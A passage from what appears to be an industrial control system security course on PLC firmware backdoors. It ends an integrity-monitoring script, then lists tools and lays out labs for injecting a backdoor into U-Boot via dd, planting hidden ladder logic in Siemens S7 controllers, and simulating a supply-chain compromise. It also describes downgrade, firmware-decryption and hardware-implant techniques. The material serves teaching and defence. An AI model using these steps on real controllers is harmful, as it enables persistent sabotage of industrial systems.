def alert_integrity_violation(self, current_hash):
"""
Send alert to SIEM/SOC
"""
print("[!] CRITICAL: Firmware integrity violation detected!")
print(f"[!] Expected: {self.baseline_hash}")
print(f"[!] Current: {current_hash}")
# Send to SIEM
# syslog.syslog(syslog.LOG_ALERT, f"PLC firmware tampered: {self.plc_ip}")
# Usage
attestation = RuntimeAttestation("192.168.1.10")
attestation.establish_baseline()
attestation.continuous_monitoring(interval=600) # Check every 10 minutes

8. Tools & Resources
Firmware Extraction & Analysis
●​
●​
●​
●​
●​
●​
●​

binwalk: Firmware extraction (apt install binwalk)
Firmware Analysis Toolkit (FAT): https://github.com/attify/firmware-analysis-toolkit
EMBA: Embedded Analyzer: https://github.com/e-m-b-a/emba
Ghidra: https://ghidra-sre.org
radare2/Cutter: https://rada.re
OpenOCD: JTAG debugging: http://openocd.org
flashrom: SPI flash reading: https://flashrom.org

Hardware Tools

●​
●​
●​
●​
●​

Bus Pirate: Universal serial interface tool
CH341A: USB SPI programmer (~$5 on AliExpress)
J-Link: Professional JTAG debugger
SOIC-8 Clip: For in-circuit flash reading
Logic Analyzer: Saleae Logic, DSLogic

PLC-Specific
●​
●​
●​
●​

PLCinject: https://github.com/SCADACS/PLCinject
Snap7: S7 protocol library: http://snap7.sourceforge.net
python-snap7: Python bindings
s7-pcaps: Example S7 traffic for analysis

Defensive Tools
●​ CHIPSEC: Platform security assessment: https://github.com/chipsec/chipsec
●​ Tripwire: File integrity monitoring
●​ AIDE: Advanced Intrusion Detection Environment

9. Hands-On Lab Exercises
Lab 1: Firmware Extraction and Analysis
Objective: Extract and analyze OpenPLC firmware
Steps:
1.​ Download OpenPLC Raspberry Pi image
wget
https://github.com/thiagoralves/OpenPLC_v3/releases/download/v3/OpenPLC_v3_rpi.zip
unzip OpenPLC_v3_rpi.zip
2.​ Extract filesystem
binwalk -e OpenPLC_v3_rpi.img
cd _OpenPLC_v3_rpi.img.extracted/
3.​ Analyze for hardcoded credentials
grep -r "password" .
grep -r "admin" .
find . -name "*.conf" -exec cat {} \;
4.​ Locate web server binary
find . -name "webserver" -o -name "openplc"
file ./usr/bin/openplc # Check architecture

5.​ Reverse engineer with Ghidra
# Load into Ghidra and analyze
# Find authentication function
# Document vulnerabilities

Lab 2: Bootloader Backdoor Injection (Emulated)
Objective: Inject backdoor into U-Boot bootloader
Steps:
1.​ Download U-Boot source
git clone https://github.com/u-boot/u-boot.git
cd u-boot
2.​ Compile for ARM
export CROSS_COMPILE=arm-linux-gnueabimake qemu_arm_defconfig
make -j4
3.​ Create backdoor payload (from section 4.1)
# Compile backdoor module
arm-linux-gnueabi-gcc -c backdoor.c -o backdoor.o
4.​ Patch U-Boot binary
# Insert backdoor at specific offset
dd if=backdoor.o of=u-boot.bin bs=1 seek=262144 conv=notrunc
5.​ Test in QEMU
qemu-system-arm -M virt -kernel u-boot.bin -nographic
# Send magic packet and verify backdoor activation

Lab 3: PLC Program Backdoor (Siemens S7)
Objective: Inject hidden ladder logic
Steps:
1.​ Set up PLCSim or real S7-1200
2.​ Use python-snap7 to connect
3.​ Download existing OB1
4.​ Inject hidden rung (see section 4.4)
5.​ Upload modified program
6.​ Verify backdoor activation with trigger bit

7.​ Document detection challenges

Lab 4: Firmware Integrity Monitoring
Objective: Implement continuous attestation
Steps:
1.​ Deploy runtime attestation script (section 7.3)
2.​ Establish baseline on clean PLC
3.​ Modify PLC firmware (inject test backdoor)
4.​ Observe integrity violation detection
5.​ Measure detection time
6.​ Create SIEM integration

Lab 5: Supply Chain Attack Simulation
Objective: Demonstrate build pipeline compromise
Setup:
●​ Mock firmware build server (Docker container)
●​ Simulated CI/CD pipeline
●​ Code-signing infrastructure
Attack Chain:
1.​ Compromise build server (simulated phishing)
2.​ Inject backdoor into build script
3.​ Steal code-signing certificate
4.​ Generate backdoored firmware
5.​ Distribute to "customers" (test PLCs)
6.​ Demonstrate backdoor activation
7.​ Implement detection controls

10. Advanced Topics
Firmware Encryption and Obfuscation
Many modern PLCs encrypt firmware to prevent analysis. Techniques to bypass:
●​ Cold Boot Attacks: Extract encryption keys from RAM
●​ Power Analysis: Side-channel attacks to recover keys
●​ Fault Injection: Glitch processor during boot to skip decryption checks

Firmware Downgrade Attacks
If vendor patches backdoor in new firmware, attacker downgrades to vulnerable version:

# Bypass anti-rollback protection
def downgrade_firmware(plc_ip, old_firmware_version):
# Exploit: Modify firmware version number in header
# PLC accepts "new" firmware that's actually old vulnerable version
pass

Hardware Implants
Physical modification of PLC boards:
●​ FPGA Interposers: Insert between CPU and flash chip
●​ Malicious ICs: Replace legitimate chip with backdoored version
●​ PCB Modification: Add wireless exfiltration capability

Summary
Firmware manipulation provides the deepest level of persistence and stealth in ICS
environments. Successful firmware backdoors:
●​
●​
●​
●​

Survive reboots, power cycles, and software updates
Operate below detection layers (antivirus, EDR, IDS)
Provide complete control over device behavior
Are extremely difficult to detect and remediate

Key Takeaways:
●​
●​
●​
●​
●​

Firmware extraction requires both hardware and software techniques
Reverse engineering reveals backdoor injection points
Persistence mechanisms must survive firmware updates
Defense requires secure boot, integrity monitoring, and supply chain security
Physical security of manufacturing/build infrastructure is critical

